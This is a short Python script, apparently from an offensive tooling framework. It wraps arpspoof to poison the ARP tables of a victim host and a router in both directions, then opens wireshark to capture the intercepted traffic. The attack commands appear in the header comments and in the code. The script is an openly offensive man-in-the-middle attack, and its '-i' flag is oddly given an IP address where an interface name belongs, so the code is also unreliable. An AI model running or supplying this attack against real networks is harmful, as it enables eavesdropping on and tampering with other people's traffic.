# sudo arpspoof -i 10.10.10.101 -t 10.10.10.100 10.10.10.254
# sudo arpspoof -i 10.10.10.101 -t 10.10.10.254 10.10.10.100
#

from tools.Utility import *


class Arpspoof(UtilityTool):
    def __init__(self, config_file):
        super(Arpspoof, self).__init__(config_file)

    def get_basic_command(self, cmd):
        command1 = 'arpspoof -i {} -t {} {}'.format(cmd['myip'], cmd['victimip'], cmd['routerip'])
        command2 = 'arpspoof -i {} -t {} {}'.format(cmd['myip'], cmd['routerip'], cmd['victimip'])
        command3 = 'wireshark'
        command = [command1, command2,command3]
        return command

if __name__ == '__main__':
    test_obj = Arpspoof("config.json")
    cmd = {}

    cmd['victimip'] = '192.168.1.102'
    cmd['myip'] = '192.168.1.101'
    cmd['routerip'] = '192.168.1.1'

    cmd = (test_obj.get_basic_command(cmd))
    test_obj.run_command(3, cmd)